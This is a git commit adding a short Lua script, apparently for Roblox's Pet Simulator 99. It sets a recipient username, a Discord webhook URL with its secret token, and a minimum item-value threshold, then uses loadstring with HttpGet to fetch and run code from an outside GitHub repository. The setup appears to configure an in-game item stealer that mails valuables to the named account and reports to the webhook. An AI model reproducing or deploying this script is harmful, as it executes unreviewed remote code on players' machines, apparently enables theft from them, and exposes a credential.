2505490b85e420e5e0933ff001051465e3c1a34e
nexer39 <106121640+nexer39@users.noreply.github.com>
2024-11-26 14:53:45 -0500

    Add files via upload

---
+++ ps99mail.lua
@@ -0,0 +1,7 @@
+Username = "nexer39"
+Username2 = ""
+Webhook = "https://discord.com/api/webhooks/1311046598679072828/bjUfXGM3SV03MxHyA0jTEaYOcX4YnlczCfc4jXa6SHRJZRk7Glkfnvc7jcnhTehuumc5"
+
+MinimumRAP = 50000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PS99"))()
